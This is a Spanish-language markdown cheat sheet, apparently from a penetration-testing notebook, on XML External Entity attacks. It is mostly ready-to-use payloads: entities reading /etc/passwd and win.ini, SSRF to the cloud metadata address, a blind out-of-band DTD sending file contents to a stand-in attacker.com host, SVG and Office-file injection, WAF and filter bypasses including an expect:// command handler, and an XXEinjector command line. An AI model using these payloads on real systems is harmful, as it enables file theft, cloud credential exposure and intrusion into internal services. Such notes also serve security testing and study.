---
tags: [web, xxe, xxe-oob]
status: done
---

# XXE — XML External Entity

---

## Concepto

El parser XML procesa entidades externas → lectura de archivos locales, SSRF, o RCE en casos extremos.

---

## Detección

```xml
<!-- Buscar endpoints que acepten XML:
  - Content-Type: application/xml
  - Content-Type: text/xml
  - Cambiar JSON → XML en Burp y ver si lo procesa
  - Archivos .docx/.xlsx/.svg/.pdf (XML por dentro) -->
```

---

## XXE Clásico — Lectura de Archivos

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">

<!-- Lectura con PHP wrapper (si es PHP) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

---

## XXE → SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Interno -->
<!ENTITY xxe SYSTEM "http://internal-service.local/admin">
```

---

## XXE Blind — Out-of-Band

```xml
<!-- Cuando no hay reflexión en la respuesta -->
<!-- Paso 1: DTD malicioso en tu servidor (evil.dtd) -->
<?xml version="1.0"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- Paso 2: Payload que carga el DTD remoto -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root/>
```

---

## XXE en SVG

```xml
<!-- Subir SVG con XXE embebido -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

---

## XXE en XLSX/DOCX

```
1. Descomprimir el .xlsx (es un ZIP)
2. Editar xl/workbook.xml o [Content_Types].xml
3. Insertar entidad XXE
4. Recomprimir y subir
```

---

## Bypass de Filtros

```xml
<!-- Filtran "SYSTEM" → usar PUBLIC -->
<!ENTITY xxe PUBLIC "-//B/A/EN" "http://attacker.com/">

<!-- Encoding para bypass de WAF -->
<!DOCTYPE root [<!ENTITY % a SYSTEM "http://attacker.com/"> %a;]>

<!-- Protocol handlers alternativos -->
file:///etc/passwd          → clásico
php://filter/...            → PHP
expect://id                 → si módulo expect activo (PHP)
data://text/plain,<?php ... → PHP (si parsea)
```

---

## Herramientas

```bash
# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd

# Burp Suite — Active Scan detecta XXE básicos
# XXE en archivos binarios → Burp Extension "Content Type Converter"
```

